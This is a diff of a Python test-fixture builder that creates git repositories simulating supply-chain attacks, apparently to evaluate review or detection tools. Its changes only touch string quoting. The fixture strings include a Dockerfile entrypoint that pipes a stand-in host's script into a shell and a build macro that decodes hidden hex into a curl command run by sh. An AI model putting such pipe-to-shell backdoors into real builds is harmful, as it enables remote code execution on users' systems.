@@ -52,7 +52,7 @@ def _rev(repo: Path) -> str:
 
 def _build_trojan_source(repo: Path) -> tuple[str, str]:
     (repo / "auth.py").write_text(
-        'def check_permissions(user):\n'
+        "def check_permissions(user):\n"
         '    if user.role == "guest":\n'
         "        return False\n"
         "    return True\n"
@@ -113,7 +113,7 @@ def _build_benign_plugin_loader(repo: Path) -> tuple[str, str]:
         'def discover_plugins(package_name="myapp.plugins"):\n'
         '    """Carga dinámicamente todos los módulos dentro de myapp/plugins/,\n'
         "    para que añadir un plugin nuevo sea tan simple como dejar caer un\n"
-        "    fichero .py en esa carpeta, sin tocar este registro a mano.\"\"\"\n"
+        '    fichero .py en esa carpeta, sin tocar este registro a mano."""\n'
         "    package = importlib.import_module(package_name)\n"
         "    for _, module_name, _ in pkgutil.iter_modules(package.__path__):\n"
         '        importlib.import_module(f"{package_name}.{module_name}")\n'
@@ -136,7 +136,7 @@ def _build_dependency_confusion(repo: Path) -> tuple[str, str]:
 
 def _build_docker_base_image_swap(repo: Path) -> tuple[str, str]:
     (repo / "Dockerfile").write_text(
-        "FROM python:3.11-slim\nWORKDIR /app\nCOPY . .\nCMD [\"python\", \"app.py\"]\n"
+        'FROM python:3.11-slim\nWORKDIR /app\nCOPY . .\nCMD ["python", "app.py"]\n'
     )
     _commit_all(repo, "init Dockerfile")
     base = _rev(repo)
@@ -246,7 +246,7 @@ def _build_docker_entrypoint_hijack(repo: Path) -> tuple[str, str]:
         "WORKDIR /app\n"
         "COPY . .\n"
         "RUN npm ci --production\n"
-        "ENTRYPOINT [\"/bin/sh\", \"-c\", "
+        'ENTRYPOINT ["/bin/sh", "-c", '
         '"wget -qO- http://pkg-mirror.example/boot.sh | /bin/sh && node server.js"]\n'
     )
     _commit_all(repo, "wrap entrypoint with startup healthcheck")
@@ -258,9 +258,7 @@ def _build_typosquat_popular_package(repo: Path) -> tuple[str, str]:
     _commit_all(repo, "init requirements")
     base = _rev(repo)
 
-    (repo / "requirements.txt").write_text(
-        "numpy==1.26.0\npandas==2.1.0\nsympy-dev==1.2.6\n"
-    )
+    (repo / "requirements.txt").write_text("numpy==1.26.0\npandas==2.1.0\nsympy-dev==1.2.6\n")
     _commit_all(repo, "add symbolic math support")
     return base, _rev(repo)
 
@@ -338,15 +336,14 @@ def _build_build_macro_tampering(repo: Path) -> tuple[str, str]:
 
     (repo / "configure.ac").write_text(
         "AC_INIT([imgcodec], [1.4.1])\nAM_INIT_AUTOMAKE\nAC_PROG_CC\n\n"
-        "AS_IF([test \"x$host_cpu\" = xx86_64 -a \"x$ac_cv_prog_gcc\" = xyes], [\n"
+        'AS_IF([test "x$host_cpu" = xx86_64 -a "x$ac_cv_prog_gcc" = xyes], [\n'
         "  dd if=tests/fixtures/sample_corrupt.dat bs=1 skip=16 2>/dev/null | "
         "xxd -r -p | sh\n"
         "])\n"
         "AC_OUTPUT\n"
     )
     (repo / "tests" / "fixtures" / "sample_corrupt.dat").write_text(
-        "REF_FIXTURE_V1\n0000 0000 0000 0000\n"
-        "63 75 72 6c 20 2d 66 73 53 4c 20 68 74 74 70 3a\n"
+        "REF_FIXTURE_V1\n0000 0000 0000 0000\n" "63 75 72 6c 20 2d 66 73 53 4c 20 68 74 74 70 3a\n"
     )
     _commit_all(repo, "add architecture-specific fixture decode for regression test #4471")
     return base, _rev(repo)
@@ -358,8 +355,7 @@ def _build_sandboxed_eval_plugin_system(repo: Path) -> tuple[str, str]:
     red ni filesystem, solo para fórmulas tipo hoja de cálculo. Generaliza
     la idea de benign-plugin-loader a un caso más difícil de calibrar."""
     (repo / "formulas.py").write_text(
-        "def apply_template(template, values):\n"
-        "    return template.format(**values)\n"
+        "def apply_template(template, values):\n" "    return template.format(**values)\n"
     )
     _commit_all(repo, "init static templates")
     base = _rev(repo)
@@ -374,7 +370,7 @@ def _build_sandboxed_eval_plugin_system(repo: Path) -> tuple[str, str]:
         "def evaluate_formula(expr, cell_values):\n"
         '    """Evalúa una fórmula de usuario (p.ej. "sqrt(A1) + 2") sin acceso\n'
         "    a builtins, imports ni I/O -- solo las funciones matemáticas\n"
-        "    permitidas y los valores de celda ya calculados.\"\"\"\n"
+        '    permitidas y los valores de celda ya calculados."""\n'
         "    namespace = dict(_ALLOWED_NAMES)\n"
         "    namespace.update(cell_values)\n"
         "    return eval(expr, {'__builtins__': {}}, namespace)\n"
